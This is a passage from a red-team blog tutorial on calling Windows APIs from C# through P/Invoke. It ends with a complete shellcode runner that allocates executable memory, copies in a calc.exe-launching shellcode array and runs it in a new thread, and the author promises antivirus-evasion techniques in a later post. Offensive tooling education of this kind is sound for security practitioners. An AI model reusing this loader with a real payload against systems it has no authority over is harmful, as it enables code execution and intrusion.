</pre></table></code></div></div><p>Next step is to execute the shellcode. We do that by using <code class="language-plaintext highlighter-rouge">CreateThread</code>. Before it we need to initialize some things for it to use. Then we can use it as:</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">hThread</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
<span class="n">UInt32</span> <span class="n">threadId</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
<span class="n">IntPtr</span> <span class="n">pinfo</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>

<span class="n">hThread</span> <span class="p">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="p">(</span><span class="n">UInt32</span><span class="p">)</span><span class="n">init</span><span class="p">,</span> <span class="n">pinfo</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">ref</span> <span class="n">threadId</span><span class="p">);</span>
</pre></table></code></div></div><p>Lastly we will use <code class="language-plaintext highlighter-rouge">WaitForSingleObject</code> to make our thread wait for infinite number of time.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="m">0xFFFFFFFF</span><span class="p">);</span>
</pre></table></code></div></div><p>When we put all of that together we get:</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre><td class="rouge-code"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Runtime.InteropServices</span><span class="p">;</span>

<span class="k">namespace</span> <span class="nn">demo</span>
<span class="p">{</span>
  <span class="k">class</span> <span class="nc">Program</span>
  <span class="p">{</span>
    <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flProtect</span><span class="p">);</span>

    <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
    <span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="n">UInt32</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">param</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="k">ref</span> <span class="n">UInt32</span> <span class="n">lpThreadId</span><span class="p">);</span>

    <span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
    <span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">UInt32</span> <span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hHandle</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwMilliseconds</span><span class="p">);</span>


    <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">byte</span><span class="p">[]</span> <span class="n">buf</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">193</span><span class="p">]</span> <span class="p">{</span>
      <span class="m">0xfc</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0x82</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x60</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xe5</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x64</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x30</span><span class="p">,</span>
      <span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x0c</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x14</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0xb7</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x26</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span>
      <span class="m">0xac</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x02</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xcf</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0xe2</span><span class="p">,</span><span class="m">0xf2</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span>
      <span class="m">0x57</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x10</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x11</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0xe3</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd1</span><span class="p">,</span>
      <span class="m">0x51</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0xe3</span><span class="p">,</span><span class="m">0x3a</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span>
      <span class="m">0x01</span><span class="p">,</span><span class="m">0xd6</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xcf</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc7</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xf6</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span>
      <span class="m">0x7d</span><span class="p">,</span><span class="m">0xf8</span><span class="p">,</span><span class="m">0x3b</span><span class="p">,</span><span class="m">0x7d</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xe4</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x66</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span>
      <span class="m">0x0c</span><span class="p">,</span><span class="m">0x4b</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x1c</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd3</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x04</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span>
      <span class="m">0x24</span><span class="p">,</span><span class="m">0x5b</span><span class="p">,</span><span class="m">0x5b</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x5f</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0xeb</span><span class="p">,</span>
      <span class="m">0x8d</span><span class="p">,</span><span class="m">0x5d</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x8d</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xb2</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span>
      <span class="m">0x87</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xb5</span><span class="p">,</span><span class="m">0xa2</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x68</span><span class="p">,</span><span class="m">0xa6</span><span class="p">,</span><span class="m">0x95</span><span class="p">,</span><span class="m">0xbd</span><span class="p">,</span><span class="m">0x9d</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span>
      <span class="m">0x3c</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x0a</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0xfb</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x05</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0x47</span><span class="p">,</span><span class="m">0x13</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span>
      <span class="m">0x00</span><span class="p">,</span><span class="m">0x53</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x00</span> <span class="p">};</span>

      <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="p">=</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
      <span class="n">IntPtr</span> <span class="n">init</span> <span class="p">=</span> <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="p">(</span><span class="n">UInt32</span><span class="p">)</span><span class="n">TYPE</span><span class="p">.</span><span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="p">(</span><span class="n">UInt32</span><span class="p">)</span><span class="n">PROTECTION</span><span class="p">.</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
      <span class="n">Marshal</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">init</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>
      <span class="n">IntPtr</span> <span class="n">hThread</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
      <span class="n">UInt32</span> <span class="n">threadId</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
      <span class="n">IntPtr</span> <span class="n">pinfo</span> <span class="p">=</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">;</span>
      <span class="n">hThread</span> <span class="p">=</span> <span class="nf">CreateThread</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="p">(</span><span class="n">UInt32</span><span class="p">)</span><span class="n">init</span><span class="p">,</span> <span class="n">pinfo</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">ref</span> <span class="n">threadId</span><span class="p">);</span>
      <span class="nf">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="m">0xFFFFFFFF</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="k">public</span> <span class="k">enum</span> <span class="n">TYPE</span>
    <span class="p">{</span>
      <span class="n">MEM_COMMIT</span> <span class="p">=</span> <span class="m">0x00001000</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">enum</span> <span class="n">PROTECTION</span>
    <span class="p">{</span>
      <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">=</span> <span class="m">0x40</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Compiling and running it gives us: <br /> <img data-src="/assets/img/WinAPI-PInvoke/calc.png" alt="Popped Calc.exe" data-proofer-ignore> <br /> We get our shellcode running and poping calculator.</p><h2 id="conclusion"><span class="mr-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This was a small introduction to Windows API and C# and how we can use both of them to create red team tools for ouir use. This is however very basic and will get detected or blocked. In the next post I’ll mention some methods we can use to enhance this and make something that would help us bypass certain type of defenses.</p><h2 id="references"><span class="mr-2">References</span><a href="#references" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Thanks to all of these which I heavily referenced from.</p><ul><li><a href="https://stackoverflow.com/a/53894340">CLR Execution Model</a><li><a href="https://www.geeksforgeeks.org/difference-between-managed-and-unmanaged-code-in-net/">Managed VS. Unmanaged Code</a><li><a href="https://docs.microsoft.com/en-us/dotnet/standard/managed-code">Managed Code - Microsoft</a><li><a href="https://posts.specterops.io/operational-challenges-in-offensive-c-355bd232a200">Operational Challenges in Offensive C#</a><li><a href="https://www.c-sharpcorner.com/article/working-with-win32-api-in-net/">Working with WIN32 API in .NET</a><li><a href="https://www.pinvoke.net/">P/Invoke</a><li><a href="https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d">Offensive P/Invoke: Leveraging the Win32 API from Managed Code</a><li><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-1/">Red Team Tactics: Utilizing Syscalls in C# - Prerequisite Knowledge</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/red-team/" class="post-tag no-text-decoration" >Red Team</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=WinAPI+and+P%2FInvoke+in+C%23+-+Crypt0ace&url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FWinAPI-and-PInvoke-in-CSharp%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=WinAPI+and+P%2FInvoke+in+C%23+-+Crypt0ace&u=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FWinAPI-and-PInvoke-in-CSharp%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FWinAPI-and-PInvoke-in-CSharp%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/NHA-Part-3/">AD Pwnage: Ninja Hackers Academy Part 3</a><li><a href="/posts/NHA-Part-2/">AD Pwnage: Ninja Hackers Academy Part 2</a><li><a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/">Using D/Invoke for Offensive Tool Development in C#</a><li><a href="/posts/Staying-under-the-Radar-Part-2/">Staying Under the Radar - Part 2 - Hiding IAT using Delegates</a><li><a href="/posts/Shellcode-Injection-Techniques/">Shellcode Injection in C# - Part 1 - Process Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-2/"><div class="card-body"> <em class="small" data-ts="1662663600" data-df="ll" > Sep 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 2 - Process Hollowing</h3><div class="text-muted small"><p> Introduction This post is part 2 of shellcode injection techniques. You can read part 1 here. In this one, we will look into Process Hollowing in C#. Process Hollowing Process Hollowing is a techn...</p></div></div></a></div><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-3/"><div class="card-body"> <em class="small" data-ts="1663268400" data-df="ll" > Sep 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</h3><div class="text-muted small"><p> Introduction In this post we are going to look at another method for shellcode execution. THis involves using the API call QueueUserAPC. Like previous Process Hollowing, in this we are going to ope...</p></div></div></a></div><div class="card"> <a href="/posts/Staying-under-the-Radar/"><div class="card-body"> <em class="small" data-ts="1663441200" data-df="ll" > Sep 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs</h3><div class="text-muted small"><p> Introduction In this post we are going to look at two “features” (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microso...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/DLL-Sideloading/" class="btn btn-outline-primary" prompt="Older"><p>Guide to DLL Sideloading</p></a> <a href="/posts/Shellcode-Injection-Techniques/" class="btn btn-outline-primary" prompt="Newer"><p>Shellcode Injection in C# - Part 1 - Process Injection</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/crypt0acee">Ahmed Sher</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
